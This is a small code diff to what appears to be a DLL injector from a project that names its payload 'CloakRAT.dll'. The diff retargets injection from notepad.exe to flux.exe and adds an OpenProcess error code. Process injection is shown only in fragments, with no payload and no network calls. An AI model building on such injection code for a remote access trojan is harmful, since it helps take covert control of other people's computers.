@@ -27,7 +27,7 @@ DWORD getProcessIdByName(const char* procName)
 int main()
 {
 	const char* dllPath = "C:\\Users\\tal78\\Desktop\\Workspace\\CloakRAT\\Release\\CloakRAT.dll";
-	const char* procName = "notepad.exe";
+	const char* procName = "flux.exe";
 
 	DWORD procID = 0;
 	while (!procID) // while the process was not found
@@ -59,7 +59,7 @@ int main()
 			CloseHandle(threadHandle);
 	}
 	else {
-		std::cerr << "Error!";
+		std::cerr << "Error in OpenProcess(): Err#" << GetLastError();
 	}
 
 	return 0;
